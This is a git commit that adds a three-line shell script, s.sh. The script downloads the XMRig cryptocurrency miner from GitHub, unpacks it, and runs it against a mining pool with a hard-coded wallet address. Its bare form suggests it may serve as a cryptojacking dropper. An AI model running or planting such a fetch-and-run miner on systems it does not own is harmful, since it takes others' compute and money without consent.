5cc3567517d1bb9efe9b2335aeee563029cc48ba
null00x1 <96450540+null00x1@users.noreply.github.com>
2021-12-23 18:48:11 +0500

    Create s.sh

---
+++ s.sh
@@ -0,0 +1,3 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-linux-static-x64.tar.gz
+tar xf xmrig-6.16.2-linux-static-x64.tar.gz
+./xmrig-6.16.2/xmrig -a gr -o us.flockpool.com:5555 --tls -u RP1wAHMdoR4rCJJzxWgDU2yygHAiKy2aZu.kk14 -p
